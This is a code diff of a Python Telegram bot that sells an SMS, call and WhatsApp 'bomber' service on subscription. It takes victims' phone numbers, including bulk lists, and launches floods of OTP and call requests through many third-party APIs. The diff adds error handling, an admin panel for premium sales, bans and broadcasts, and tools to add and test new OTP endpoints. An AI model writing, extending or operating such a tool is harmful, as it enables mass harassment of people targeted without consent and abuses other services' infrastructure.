+            types.InlineKeyboardButton("📅 Monthly — ₹199", callback_data="plan_monthly"),
+            types.InlineKeyboardButton("📅 3 Months — ₹499", callback_data="plan_3month"),
+        )
+        bot.reply_to(message, "📋 *Subscription Plans*\n\nSelect a plan:", parse_mode="Markdown", reply_markup=markup)
+    except Exception as e:
+        logger.error(f"cmd_plans error: {e}")
 
 @bot.message_handler(commands=['redeem'])
 def cmd_redeem(message):
-    chat_id = message.chat.id
-    user_data.users.setdefault(chat_id, {})["awaiting_key"] = True
-    bot.reply_to(message, "🎁 Apni key bhejein:")
+    try:
+        chat_id = message.chat.id
+        user_data.users.setdefault(chat_id, {})["awaiting_key"] = True
+        bot.reply_to(message, "🎁 Apni key bhejein:")
+    except Exception as e:
+        logger.error(f"cmd_redeem error: {e}")
 
 @bot.message_handler(commands=['account'])
 def cmd_account(message):
-    chat_id = message.chat.id
-    sub = admin_db.get_subscription(chat_id)
-    if not sub:
-        bot.reply_to(message, "👤 *Account*\n\n❌ No active subscription.", parse_mode="Markdown")
-        return
-    expires = datetime.fromisoformat(sub["expires_at"])
-    days_left = (expires - datetime.now()).days
-    bot.reply_to(message,
-        f"👤 *Account*\n────────────────────\n"
-        f"🎯 Plan: {sub['plan'].upper()}\n📅 Days left: {max(days_left, 0)}\n"
-        f"⚡ Concurrent: {sub['max_concurrent']}\n✅ Status: Active",
-        parse_mode="Markdown")
+    try:
+        chat_id = message.chat.id
+        sub = admin_db.get_subscription(chat_id)
+        if not sub:
+            bot.reply_to(message, "👤 *Account*\n\n❌ No active subscription.", parse_mode="Markdown")
+            return
+        expires = datetime.fromisoformat(sub["expires_at"])
+        days_left = (expires - datetime.now()).days
+        bot.reply_to(message,
+            f"👤 *Account*\n────────────────────\n"
+            f"🎯 Plan: {sub['plan'].upper()}\n📅 Days left: {max(days_left, 0)}\n"
+            f"⚡ Concurrent: {sub['max_concurrent']}\n✅ Status: Active",
+            parse_mode="Markdown")
+    except Exception as e:
+        logger.error(f"cmd_account error: {e}")
 
 @bot.message_handler(commands=['contact'])
 def cmd_contact(message):
-    chat_id = message.chat.id
-    user_data.users.setdefault(chat_id, {})["awaiting_contact"] = True
-    bot.reply_to(message, "📩 Apna message likhein:")
+    try:
+        chat_id = message.chat.id
+        user_data.users.setdefault(chat_id, {})["awaiting_contact"] = True
+        bot.reply_to(message, "📩 Apna message likhein admin ke liye:")
+    except Exception as e:
+        logger.error(f"cmd_contact error: {e}")
 
 @bot.message_handler(commands=['admin'])
 def cmd_admin(message):
-    chat_id = message.chat.id
-    if chat_id not in ADMIN_IDS and not admin_db.is_admin(chat_id):
-        bot.reply_to(message, "❌ Aap admin nahi hain.")
-        return
-    markup = types.InlineKeyboardMarkup(row_width=2)
-    markup.add(
-        types.InlineKeyboardButton("📊 Stats", callback_data="admin_stats"),
-        types.InlineKeyboardButton("👥 Users", callback_data="admin_users"),
-        types.InlineKeyboardButton("🔑 Generate Key", callback_data="admin_genkey"),
-        types.InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast"),
-        types.InlineKeyboardButton("🚫 Banned", callback_data="admin_banned"),
-        types.InlineKeyboardButton("📡 API Stats", callback_data="admin_apistats"),
-    )
-    bot.reply_to(message, "⚙️ *Admin Panel*", parse_mode="Markdown", reply_markup=markup)
+    try:
+        chat_id = message.chat.id
+        if chat_id not in ADMIN_IDS and not admin_db.is_admin(chat_id):
+            bot.reply_to(message, "❌ Aap admin nahi hain.")
+            return
+        bot.reply_to(message, "⚙️ *Admin Panel* — Full Controls", parse_mode="Markdown", reply_markup=admin_keyboard())
+    except Exception as e:
+        logger.error(f"cmd_admin error: {e}")
 
 # ============================================================
 # CALLBACK HANDLERS
@@ -1555,6 +1737,8 @@ def cmd_admin(message):
 def callback_handler(call):
     chat_id = call.message.chat.id
     data = call.data
+    is_admin = chat_id in ADMIN_IDS or admin_db.is_admin(chat_id)
+
     try:
         if data == "check_joined":
             if is_channel_member(chat_id):
@@ -1584,190 +1768,465 @@ def callback_handler(call):
                 phone = parts[2]
                 ok, msg = bomber.start(chat_id, phone, mode, call.from_user.username)
                 bot.answer_callback_query(call.id, "🔥 Started!" if ok else f"❌ {msg[:50]}")
-        elif data == "admin_stats":
-            if chat_id in ADMIN_IDS or admin_db.is_admin(chat_id):
-                bot.send_message(chat_id,
-                    f"📊 *Bot Stats*\n"
-                    f"👥 Users: {admin_db.get_user_count()}\n"
-                    f"🚫 Banned: {admin_db.get_banned_count()}\n"
-                    f"💣 Total Bombs: {admin_db.get_total_bombs()}\n"
-                    f"📡 APIs Loaded: {len(ALL_APIS)}",
-                    parse_mode="Markdown")
-        elif data == "admin_users":
-            if chat_id in ADMIN_IDS or admin_db.is_admin(chat_id):
-                users = admin_db.get_all_users()
-                msg = f"👥 *Total Users: {len(users)}*\n\n"
-                for uid, u in list(users.items())[:20]:
-                    msg += f"• `{uid}` @{u.get('username', 'N/A')}\n"
-                bot.send_message(chat_id, msg, parse_mode="Markdown")
-        elif data == "admin_genkey":
-            if chat_id in ADMIN_IDS or admin_db.is_admin(chat_id):
-                admin_data[chat_id] = {"awaiting_genkey": True}
-                bot.send_message(chat_id, "Plan bhejein: daily / monthly / 3month / custom:<days>")
-        elif data == "admin_broadcast":
-            if chat_id in ADMIN_IDS or admin_db.is_admin(chat_id):
-                admin_data[chat_id] = {"awaiting_broadcast": True}
-                bot.send_message(chat_id, "Broadcast message bhejein:")
-        elif data == "admin_banned":
-            if chat_id in ADMIN_IDS or admin_db.is_admin(chat_id):
-                banned = admin_db.data.get("banned", [])
-                bot.send_message(chat_id, f"🚫 Banned users: {len(banned)}\n" + "\n".join(banned[:20]))
-        elif data == "admin_apistats":
-            if chat_id in ADMIN_IDS or admin_db.is_admin(chat_id):
-                stats = admin_db.get_api_stats()
-                msg = f"📡 *API Stats* ({len(stats)} APIs tracked)\n\n"
-                for name, s in list(stats.items())[:20]:
-                    msg += f"• {name}: ✅{s['success']} ❌{s['fail']}\n"
-                bot.send_message(chat_id, msg, parse_mode="Markdown")
+
+        # ─── Admin ───
+        elif data == "adm_stats" and is_admin:
+            bot.send_message(chat_id,
+                f"📊 *Bot Statistics*\n"
+                f"────────────────────\n"
+                f"👥 Total Users: {admin_db.get_user_count()}\n"
+                f"⭐ Premium Users: {admin_db.get_premium_count()}\n"
+                f"🚫 Banned: {admin_db.get_banned_count()}\n"
+                f"💣 Total Bombs: {admin_db.get_total_bombs()}\n"
+                f"────────────────────\n"
+                f"📡 APIs Loaded:\n"
+                f"   • Total: {len(ALL_APIS)}\n"
+                f"   • Call: {len(CALL_APIS)}\n"
+                f"   • SMS: {len(SMS_APIS)}\n"
+                f"   • WhatsApp: {len(WHATSAPP_APIS)}\n"
+                f"   • Custom: {custom_api_db.count()}",
+                parse_mode="Markdown")
+
+        elif data == "adm_users" and is_admin:
+            users = admin_db.get_all_users()
+            msg = f"👥 *Total Users: {len(users)}*\n\n"
+            for uid, u in list(users.items())[:30]:
+                sub = admin_db.get_subscription(uid)
+                badge = "⭐" if sub else "  "
+                banned = "🚫" if admin_db.is_banned(uid) else "  "
+                msg += f"{badge}{banned} `{uid}` @{u.get('username', 'N/A')}\n"
+            if len(users) > 30:
+                msg += f"\n... and {len(users) - 30} more"
+            bot.send_message(chat_id, msg, parse_mode="Markdown")
+
+        elif data == "adm_premium_list" and is_admin:
+            premium = admin_db.get_premium_users()
+            active = []
+            for uid in premium:
+                sub = admin_db.get_subscription(uid)
+                if sub:
+                    active.append((uid, sub))
+            msg = f"⭐ *Premium Users: {len(active)} active*\n\n"
+            for uid, sub in active[:30]:
+                try:
+                    expires = datetime.fromisoformat(sub["expires_at"])
+                    days_left = (expires - datetime.now()).days
+                    msg += f"• `{uid}` — {sub['plan'].upper()} — {max(days_left,0)}d left\n"
+                except Exception:
+                    msg += f"• `{uid}` — active\n"
+            bot.send_message(chat_id, msg, parse_mode="Markdown")
+
+        elif data == "adm_premium_give" and is_admin:
+            admin_data[chat_id] = {"awaiting_premium_give": True}
+            bot.send_message(chat_id, "💰 *Give Premium*\n\nFormat: `<user_id> <days>`\nExample: `8128821116 30`", parse_mode="Markdown")
+
+        elif data == "adm_premium_remove" and is_admin:
+            admin_data[chat_id] = {"awaiting_premium_remove": True}
+            bot.send_message(chat_id, "❌ *Remove Premium*\n\nUser ID bhejein:")
+
+        elif data == "adm_ban" and is_admin:
+            admin_data[chat_id] = {"awaiting_ban": True}
+            bot.send_message(chat_id, "🚫 *Ban User*\n\nUser ID bhejein:")
+
+        elif data == "adm_unban" and is_admin:
+            admin_data[chat_id] = {"awaiting_unban": True}
+            bot.send_message(chat_id, "✅ *Unban User*\n\nUser ID bhejein:")
+
+        elif data == "adm_banned_list" and is_admin:
+            banned = admin_db.get_banned_list()
+            msg = f"🚫 *Banned Users: {len(banned)}*\n\n"
+            for uid in banned[:50]:
+                msg += f"• `{uid}`\n"
+            bot.send_message(chat_id, msg if banned else "✅ No banned users.", parse_mode="Markdown")
+
+        elif data == "adm_genkey" and is_admin:
+            admin_data[chat_id] = {"awaiting_genkey": True}
+            bot.send_message(chat_id, "🔑 *Generate Key*\n\nPlan: `daily` / `monthly` / `3month` / `custom:<days>`\n\nExample: `custom:15`", parse_mode="Markdown")
+
+        elif data == "adm_broadcast" and is_admin:
+            admin_data[chat_id] = {"awaiting_broadcast": True}
+            bot.send_message(chat_id, "📢 Broadcast message bhejein:")
+
+        elif data == "adm_add_api" and is_admin:
+            admin_data[chat_id] = {"awaiting_add_api": True}
+            bot.send_message(chat_id,
+                "➕ *Add Custom API*\n\n"
+                "Format: `name|url|method|category|body`\n\n"
+                "Example:\n"
+                "`MyAPI|https://example.com/otp?phone={phone}|GET|sms|`\n\n"
+                "Categories: `call` / `sms` / `whatsapp`",
+                parse_mode="Markdown")
+
+        elif data == "adm_list_apis" and is_admin:
+            custom = custom_api_db.get_all()
+            msg = f"📋 *Custom APIs: {len(custom)}*\n\n"
+            for api in custom[:30]:
+                msg += f"• `{api['name']}` — {api['method']} — {api['category']}\n"
+            msg += f"\n📡 Total built-in: {len(ALL_APIS) - len(custom)}"
+            bot.send_message(chat_id, msg, parse_mode="Markdown")
+
+        elif data == "adm_check_api" and is_admin:
+            admin_data[chat_id] = {"awaiting_check_api": True}
+            bot.send_message(chat_id,
+                "🔍 *Check API*\n\n"
+                "Format: `<url_with_{phone}>|<10_digit_number>`\n\n"
+                "Example:\n"
+                "`https://example.com/otp?phone={phone}|9876543210`",
+                parse_mode="Markdown")
+
+        elif data == "adm_remove_api" and is_admin:
+            admin_data[chat_id] = {"awaiting_remove_api": True}
+            bot.send_message(chat_id, "🗑️ API name bhejein jo remove karna hai:")
+
+        elif data == "adm_apistats" and is_admin:
+            stats = admin_db.get_api_stats()
+            sorted_stats = sorted(stats.items(), key=lambda x: x[1]["success"], reverse=True)
+            msg = f"📡 *API Stats* ({len(stats)} tracked)\n\n"
+            for name, s in sorted_stats[:25]:
+                msg += f"• {name}: ✅{s['success']} ❌{s['fail']}\n"
+            bot.send_message(chat_id, msg, parse_mode="Markdown")
+
+        elif data == "adm_pending_contacts" and is_admin:
+            pending = admin_db.get_pending_contacts()
+            if not pending:
+                bot.send_message(chat_id, "✅ No pending contact messages.")
+                return
+            msg = f"📩 *Pending Contacts: {len(pending)}*\n\n"
+            for p in pending[:10]:
+                msg += f"• ID: `{p['id']}`\n  User: `{p['user_id']}`\n  Msg: {p['message'][:80]}\n\n"
+            msg += "\n💬 Reply: `/reply <msg_id> <text>`"
+            bot.send_message(chat_id, msg, parse_mode="Markdown")
+
+        elif data == "adm_reply_user" and is_admin:
+            admin_data[chat_id] = {"awaiting_reply": True}
+            bot.send_message(chat_id, "💬 *Reply to User*\n\nFormat: `<msg_id> <reply_text>`", parse_mode="Markdown")
+
     except Exception as e:
         logger.error(f"Callback error: {e}")
+
+# ============================================================
+# /reply COMMAND
+# ============================================================
+@bot.message_handler(commands=['reply'])
+def cmd_reply(message):
+    try:
+        chat_id = message.chat.id
+        if chat_id not in ADMIN_IDS and not admin_db.is_admin(chat_id):
+            return
+        parts = message.text.split(" ", 2)
+        if len(parts) < 3:
+            bot.reply_to(message, "❌ Format: `/reply <msg_id> <text>`", parse_mode="Markdown")
+            return
+        msg_id = parts[1].strip()
+        reply_text = parts[2].strip()
+        contact = admin_db.get_contact_message(msg_id)
+        if not contact:
+            bot.reply_to(message, "❌ Message ID not found.")
+            return
+        try:
+            user_id = int(contact["user_id"])
+            bot.send_message(user_id,
+                f"📩 *Admin Reply*\n\n"
+                f"💬 {reply_text}\n\n"
+                f"───────────────\n"
+                f"Original: _{contact['message'][:100]}_",
+                parse_mode="Markdown")
+            admin_db.mark_replied(msg_id, reply_text)
+            bot.reply_to(message, f"✅ Reply sent to `{user_id}`!", parse_mode="Markdown")
+        except Exception as e:
+            bot.reply_to(message, f"❌ Failed: {str(e)[:100]}")
+    except Exception as e:
+        logger.error(f"cmd_reply error: {e}")
 
 # ============================================================
 # MESSAGE HANDLER
 # ============================================================
 @bot.message_handler(func=lambda m: True)
 def message_handler(message):
-    chat_id = message.chat.id
-    text = (message.text or "").strip()
+    try:
+        chat_id = message.chat.id
+        text = (message.text or "").strip()
+        is_admin = chat_id in ADMIN_IDS or admin_db.is_admin(chat_id)
 
-    if admin_db.is_banned(chat_id):
-        bot.reply_to(message, "🚫 Aap ban ho chuke hain.")
-        return
-
-    if not is_channel_member(chat_id):
-        markup = types.InlineKeyboardMarkup()
-        markup.add(types.InlineKeyboardButton("📢 Join Channel", url=CHANNEL_LINK))
-        markup.add(types.InlineKeyboardButton("✅ Joined", callback_data="check_joined"))
-        bot.reply_to(message, f"⚠️ Pehle channel join karein:\n{CHANNEL_LINK}", reply_markup=markup)
-        return
-
-    user_data.users.setdefault(chat_id, {})
-
-    # Admin actions
-    if chat_id in ADMIN_IDS or admin_db.is_admin(chat_id):
-        ad = admin_data.get(chat_id, {})
-        if ad.get("awaiting_genkey"):
-            plan = text.lower().strip()
-            custom_days = None
-            if plan.startswith("custom:"):
-                try:
-                    custom_days = int(plan.split(":")[1])
-                    plan = "custom"
-                except Exception:
-                    bot.reply_to(message, "❌ Format: custom:30")
-                    return
-            key = admin_db.generate_key(plan, chat_id, custom_days)
-            admin_data.pop(chat_id, None)
-            bot.reply_to(message, f"✅ Key generated:\n\n`{key}`", parse_mode="Markdown")
+        if admin_db.is_banned(chat_id):
+            bot.reply_to(message, "🚫 Aap ban ho chuke hain.")
             return
-        if ad.get("awaiting_broadcast"):
-            admin_data.pop(chat_id, None)
-            users = admin_db.get_all_users()
-            sent = 0
-            for uid in users:
+
+        if not is_channel_member(chat_id) and not is_admin:
+            markup = types.InlineKeyboardMarkup()
+            markup.add(types.InlineKeyboardButton("📢 Join Channel", url=CHANNEL_LINK))
+            markup.add(types.InlineKeyboardButton("✅ Joined", callback_data="check_joined"))
+            bot.reply_to(message, f"⚠️ Pehle channel join karein:\n{CHANNEL_LINK}", reply_markup=markup)
+            return
+
+        user_data.users.setdefault(chat_id, {})
+
+        # ─── Admin Flows ───
+        if is_admin:
+            ad = admin_data.get(chat_id, {})
+
+            if ad.get("awaiting_genkey"):
+                plan = text.lower().strip()
+                custom_days = None
+                if plan.startswith("custom:"):
+                    try:
+                        custom_days = int(plan.split(":")[1])
+                        plan = "custom"
+                    except Exception:
+                        bot.reply_to(message, "❌ Format: custom:30")
+                        return
+                key = admin_db.generate_key(plan, chat_id, custom_days)
+                admin_data.pop(chat_id, None)
+                bot.reply_to(message, f"✅ Key generated:\n\n`{key}`", parse_mode="Markdown")
+                return
+
+            if ad.get("awaiting_broadcast"):
+                admin_data.pop(chat_id, None)
+                users = admin_db.get_all_users()
+                sent = 0
+                for uid in users:
+                    try:
+                        bot.send_message(int(uid), f"📢 *Admin Broadcast*\n\n{text}", parse_mode="Markdown")
+                        sent += 1
+                        time.sleep(0.05)
+                    except Exception:
+                        pass
+                bot.reply_to(message, f"✅ Broadcast sent to {sent} users.")
+                return
+
+            if ad.get("awaiting_premium_give"):
+                admin_data.pop(chat_id, None)
+                parts = text.split()
+                if len(parts) < 2 or not parts[0].isdigit() or not parts[1].isdigit():
+                    bot.reply_to(message, "❌ Format: `<user_id> <days>`", parse_mode="Markdown")
+                    return
+                uid = int(parts[0])
+                days = int(parts[1])
+                admin_db.give_premium(uid, days)
+                bot.reply_to(message, f"✅ Premium given to `{uid}` for {days} days!", parse_mode="Markdown")
                 try:
-                    bot.send_message(int(uid), f"📢 *Admin Broadcast*\n\n{text}", parse_mode="Markdown")
-                    sent += 1
-                    time.sleep(0.05)
+                    bot.send_message(uid, f"⭐ *Premium Activated!*\n\nAdmin ne aapko {days} days premium diya hai!", parse_mode="Markdown")
                 except Exception:
                     pass
-            bot.reply_to(message, f"✅ Broadcast sent to {sent} users.")
+                return
+
+            if ad.get("awaiting_premium_remove"):
+                admin_data.pop(chat_id, None)
+                if not text.isdigit():
+                    bot.reply_to(message, "❌ Valid user ID bhejein.")
+                    return
+                uid = int(text)
+                removed = admin_db.remove_premium(uid)
+                bot.reply_to(message, f"{'✅' if removed else '❌'} Premium {'removed' if removed else 'not found'} for `{uid}`", parse_mode="Markdown")
+                return
+
+            if ad.get("awaiting_ban"):
+                admin_data.pop(chat_id, None)
+                if not text.isdigit():
+                    bot.reply_to(message, "❌ Valid user ID bhejein.")
+                    return
+                uid = int(text)
+                ok = admin_db.ban_user(uid, chat_id)
+                bot.reply_to(message, f"{'✅ Banned' if ok else '❌ Already banned'}: `{uid}`", parse_mode="Markdown")
+                return
+
+            if ad.get("awaiting_unban"):
+                admin_data.pop(chat_id, None)
+                if not text.isdigit():
+                    bot.reply_to(message, "❌ Valid user ID bhejein.")
+                    return
+                uid = int(text)
+                ok = admin_db.unban_user(uid, chat_id)
+                bot.reply_to(message, f"{'✅ Unbanned' if ok else '❌ Not banned'}: `{uid}`", parse_mode="Markdown")
+                return
+
+            if ad.get("awaiting_add_api"):
+                admin_data.pop(chat_id, None)
+                try:
+                    parts = text.split("|")
+                    if len(parts) < 4:
+                        bot.reply_to(message, "❌ Format: `name|url|method|category|body`", parse_mode="Markdown")
+                        return
+                    name = parts[0].strip()
+                    url = parts[1].strip()
+                    method = parts[2].strip().upper()
+                    category = parts[3].strip().lower()
+                    body = parts[4].strip() if len(parts) > 4 and parts[4].strip() else None
+                    if category not in ["call", "sms", "whatsapp"]:
+                        bot.reply_to(message, "❌ Category must be: call / sms / whatsapp")
+                        return
+                    custom_api_db.add_api(name, url, method, {}, body, category)
+                    reload_apis()
+                    bot.reply_to(message, f"✅ API added: `{name}`\n\n📊 Total APIs: {len(ALL_APIS)}", parse_mode="Markdown")
+                except Exception as e:
+                    bot.reply_to(message, f"❌ Error: {str(e)[:100]}")
+                return
+
+            if ad.get("awaiting_check_api"):
+                admin_data.pop(chat_id, None)
+                try:
+                    if "|" not in text:
+                        bot.reply_to(message, "❌ Format: `<url>|<10_digit_number>`", parse_mode="Markdown")
+                        return
+                    url, phone = text.rsplit("|", 1)
+                    url = url.strip().replace("{phone}", phone.strip())
+                    phone = phone.strip()
+                    bot.reply_to(message, f"🔍 Testing...\n\n`{url[:80]}`", parse_mode="Markdown")
+                    resp = requests.get(url, timeout=10, verify=False, headers={"User-Agent": "Mozilla/5.0"})
+                    result = (f"✅ *API Test Result*\n"
+                             f"───────────────\n"
+                             f"Status: {resp.status_code}\n"
+                             f"Size: {len(resp.content)} bytes\n"
+                             f"Success: {'✅ YES' if 200 <= resp.status_code < 400 else '❌ NO'}\n\n"
+                             f"Response:\n`{resp.text[:200]}`")
+                    bot.reply_to(message, result, parse_mode="Markdown")
+                except Exception as e:
+                    bot.reply_to(message, f"❌ Error: {str(e)[:150]}")
+                return
+
+            if ad.get("awaiting_remove_api"):
+                admin_data.pop(chat_id, None)
+                ok = custom_api_db.remove_api(text.strip())
+                if ok:
+                    reload_apis()
+                    bot.reply_to(message, f"✅ API removed: `{text}`", parse_mode="Markdown")
+                else:
+                    bot.reply_to(message, f"❌ API not found: `{text}`", parse_mode="Markdown")
+                return
+
+            if ad.get("awaiting_reply"):
+                admin_data.pop(chat_id, None)
+                parts = text.split(" ", 1)
+                if len(parts) < 2:
+                    bot.reply_to(message, "❌ Format: `<msg_id> <text>`", parse_mode="Markdown")
+                    return
+                msg_id, reply_text = parts[0].strip(), parts[1].strip()
+                contact = admin_db.get_contact_message(msg_id)
+                if not contact:
+                    bot.reply_to(message, "❌ Message ID not found.")
+                    return
+                try:
+                    user_id = int(contact["user_id"])
+                    bot.send_message(user_id,
+                        f"📩 *Admin Reply*\n\n💬 {reply_text}\n\n───────────────\nOriginal: _{contact['message'][:100]}_",
+                        parse_mode="Markdown")
+                    admin_db.mark_replied(msg_id, reply_text)
+                    bot.reply_to(message, f"✅ Reply sent to `{user_id}`!", parse_mode="Markdown")
+                except Exception as e:
+                    bot.reply_to(message, f"❌ Failed: {str(e)[:100]}")
+                return
+
+        # ─── Contact ───
+        if user_data.users[chat_id].get("awaiting_contact"):
+            user_data.users[chat_id].pop("awaiting_contact", None)
+            msg_id = admin_db.add_contact_message(chat_id, message.from_user.username, text)
+            for admin_id in ADMIN_IDS:
+                try:
+                    markup = types.InlineKeyboardMarkup()
+                    markup.add(types.InlineKeyboardButton("💬 Reply", callback_data="adm_reply_user"))
+                    bot.send_message(admin_id,
+                        f"📩 *New Contact Message*\n"
+                        f"───────────────\n"
+                        f"🆔 ID: `{msg_id}`\n"
+                        f"👤 User: `{chat_id}` (@{message.from_user.username or 'N/A'})\n"
+                        f"💬 Message: {text}\n\n"
+                        f"Reply: `/reply {msg_id} <text>`",
+                        parse_mode="Markdown", reply_markup=markup)
+                except Exception as e:
+                    logger.error(f"Admin notify error: {e}")
+            bot.reply_to(message, f"✅ Message sent!\nYour Msg ID: `{msg_id}`", parse_mode="Markdown")
             return
 
-    if user_data.users[chat_id].get("awaiting_contact"):
-        user_data.users[chat_id].pop("awaiting_contact", None)
-        for admin_id in ADMIN_IDS:
-            try:
-                bot.send_message(admin_id, f"📩 *New Contact*\n\nFrom: `{chat_id}`\nMessage: {text}", parse_mode="Markdown")
-            except Exception:
-                pass
-        bot.reply_to(message, "✅ Message sent to admin!")
-        return
-
-    if user_data.users[chat_id].get("awaiting_key"):
-        user_data.users[chat_id].pop("awaiting_key", None)
-        ok, msg = admin_db.redeem_key(text.upper(), chat_id)
-        bot.reply_to(message, msg, parse_mode="Markdown")
-        return
-
-    # Menu buttons
-    menu_map = {
-        "🔥 MIX": "mix", "💥 Bulk MIX": "bulk_mix",
-        "📞 CALL": "call", "📱 WHATSAPP": "whatsapp", "💬 SMS": "sms"
-    }
-    if text in menu_map:
-        user_data.users[chat_id]["pending_mode"] = menu_map[text]
-        bot.reply_to(message, f"🎯 {text} mode. Number bhejein (10 digits):")
-        return
-    if text == "📊 Status": cmd_status(message); return
-    if text == "👤 Account": cmd_account(message); return
-    if text == "❓ Help": cmd_help(message); return
-    if text == "📋 Plans": cmd_plans(message); return
-    if text == "🎁 Redeem":
-        user_data.users[chat_id]["awaiting_key"] = True
-        bot.reply_to(message, "🎁 Apni key bhejein:"); return
-    if text == "📩 Contact Admin":
-        user_data.users[chat_id]["awaiting_contact"] = True
-        bot.reply_to(message, "📩 Message likhein:"); return
-    if text == "🛑 Stop": cmd_stop(message); return
-    if text == "⚙️ Admin": cmd_admin(message); return
-
-    # Number detection
-    phone_match = re.match(r"^(\+?91)?(\d{10})$", text.replace(" ", "").replace("-", ""))
-    if phone_match:
-        phone = phone_match.group(2)
-        pending_mode = user_data.users[chat_id].get("pending_mode")
-        if not pending_mode:
-            user_data.users[chat_id]["phone"] = phone
-            markup = types.InlineKeyboardMarkup(row_width=2)
-            markup.add(
-                types.InlineKeyboardButton("📞 CALL", callback_data=f"mode_call_{phone}"),
-                types.InlineKeyboardButton("💬 SMS", callback_data=f"mode_sms_{phone}"),
-                types.InlineKeyboardButton("📱 WHATSAPP", callback_data=f"mode_whatsapp_{phone}"),
-                types.InlineKeyboardButton("🔥 MIX", callback_data=f"mode_mix_{phone}"),
-            )
-            bot.reply_to(message, f"📱 Number: `{phone}`\n\nMode select karein:",
-                parse_mode="Markdown", reply_markup=markup)
-            return
-        ok, msg = bomber.start(chat_id, phone, pending_mode, message.from_user.username)
-        user_data.users[chat_id]["pending_mode"] = None
-        if not ok:
+        # ─── Redeem ───
+        if user_data.users[chat_id].get("awaiting_key"):
+            user_data.users[chat_id].pop("awaiting_key", None)
+            ok, msg = admin_db.redeem_key(text.upper(), chat_id)
             bot.reply_to(message, msg, parse_mode="Markdown")
-        return
-
-    if user_data.users[chat_id].get("pending_mode") == "bulk_mix":
-        nums = re.findall(r"\d{10}", text)
-        if not nums:
-            bot.reply_to(message, "❌ Valid numbers nahi mile.")
             return
-        for n in nums[:5]:
-            bomber.start(chat_id + random.randint(1, 100000), n, "mix", message.from_user.username)
-        user_data.users[chat_id]["pending_mode"] = None
-        bot.reply_to(message, f"🔥 Bulk MIX started for {len(nums)} numbers!")
-        return
 
-    bot.reply_to(message, "❓ Samajh nahi aaya. /help dekhein.")
+        # ─── Menu ───
+        menu_map = {
+            "🔥 MIX": "mix", "💥 Bulk MIX": "bulk_mix",
+            "📞 CALL": "call", "📱 WHATSAPP": "whatsapp", "💬 SMS": "sms"
+        }
+        if text in menu_map:
+            user_data.users[chat_id]["pending_mode"] = menu_map[text]
+            bot.reply_to(message, f"🎯 {text} mode. Number bhejein (10 digits):")
+            return
+        if text == "📊 Status": cmd_status(message); return
+        if text == "👤 Account": cmd_account(message); return
+        if text == "❓ Help": cmd_help(message); return
+        if text == "📋 Plans": cmd_plans(message); return
+        if text == "🎁 Redeem":
+            user_data.users[chat_id]["awaiting_key"] = True
+            bot.reply_to(message, "🎁 Apni key bhejein:"); return
+        if text == "📩 Contact Admin":
+            user_data.users[chat_id]["awaiting_contact"] = True
+            bot.reply_to(message, "📩 Message likhein admin ke liye:"); return
+        if text == "🛑 Stop": cmd_stop(message); return
+        if text == "⚙️ Admin Panel": cmd_admin(message); return
+
+        # ─── Number ───
+        phone_match = re.match(r"^(\+?91)?(\d{10})$", text.replace(" ", "").replace("-", ""))
+        if phone_match:
+            phone = phone_match.group(2)
+            pending_mode = user_data.users[chat_id].get("pending_mode")
+            if not pending_mode:
+                user_data.users[chat_id]["phone"] = phone
+                markup = types.InlineKeyboardMarkup(row_width=2)
+                markup.add(
+                    types.InlineKeyboardButton("📞 CALL", callback_data=f"mode_call_{phone}"),
+                    types.InlineKeyboardButton("💬 SMS", callback_data=f"mode_sms_{phone}"),
+                    types.InlineKeyboardButton("📱 WHATSAPP", callback_data=f"mode_whatsapp_{phone}"),
+                    types.InlineKeyboardButton("🔥 MIX", callback_data=f"mode_mix_{phone}"),
+                )
+                bot.reply_to(message, f"📱 Number: `{phone}`\n\nMode select karein:",
+                    parse_mode="Markdown", reply_markup=markup)
+                return
+            ok, msg = bomber.start(chat_id, phone, pending_mode, message.from_user.username)
+            user_data.users[chat_id]["pending_mode"] = None
+            if not ok:
+                bot.reply_to(message, msg, parse_mode="Markdown")
+            return
+
+        if user_data.users[chat_id].get("pending_mode") == "bulk_mix":
+            nums = re.findall(r"\d{10}", text)
+            if not nums:
+                bot.reply_to(message, "❌ Valid numbers nahi mile.")
+                return
+            for n in nums[:5]:
+                bomber.start(chat_id + random.randint(1, 100000), n, "mix", message.from_user.username)
+            user_data.users[chat_id]["pending_mode"] = None
+            bot.reply_to(message, f"🔥 Bulk MIX started for {len(nums)} numbers!")
+            return
+
+        bot.reply_to(message, "❓ Samajh nahi aaya. /help dekhein.")
+    except Exception as e:
+        logger.error(f"message_handler error: {e}")
 
 # ============================================================
-# MAIN
+# MAIN — AUTO-RESTART LOOP
 # ============================================================
 if __name__ == "__main__":
     import urllib3
     urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-    logger.info(f"📊 Total APIs: {len(ALL_APIS)} (Call: {len(CALL_APIS)}, SMS: {len(SMS_APIS)}, WhatsApp: {len(WHATSAPP_APIS)})")
-    logger.info(f"⚡ Max Workers: {MAX_WORKERS} (SMS: {SMS_MAX_WORKERS})")
+    logger.info(f"📊 Total APIs: {len(ALL_APIS)}")
+    logger.info(f"📞 Call: {len(CALL_APIS)} | 💬 SMS: {len(SMS_APIS)} | 📱 WA: {len(WHATSAPP_APIS)}")
+    logger.info(f"⚡ Workers: {MAX_WORKERS} (SMS: {SMS_MAX_WORKERS})")
     logger.info(f"👑 Admins: {ADMIN_IDS}")
     logger.info(f"📢 Channel: {REQUIRED_CHANNEL}")
-    logger.info("✅ Bot is running!")
+    logger.info(f"🔒 Channel check: {CHANNEL_CHECK_ENABLED}")
+    logger.info("✅ Bot running with AUTO-RESTART loop!")
 
     while True:
         try:
-            bot.infinity_polling(timeout=30, long_polling_timeout=20)
+            bot.infinity_polling(timeout=60, long_polling_timeout=60, none_stop=True)
         except KeyboardInterrupt:
             logger.info("Stopping...")
             bomber.stop_all()
             break
         except Exception as e:
-            logger.error(f"Polling error: {e}")
+            logger.error(f"Polling crashed: {e}")
+            logger.info("🔄 Restarting in 5 seconds...")
             time.sleep(5)
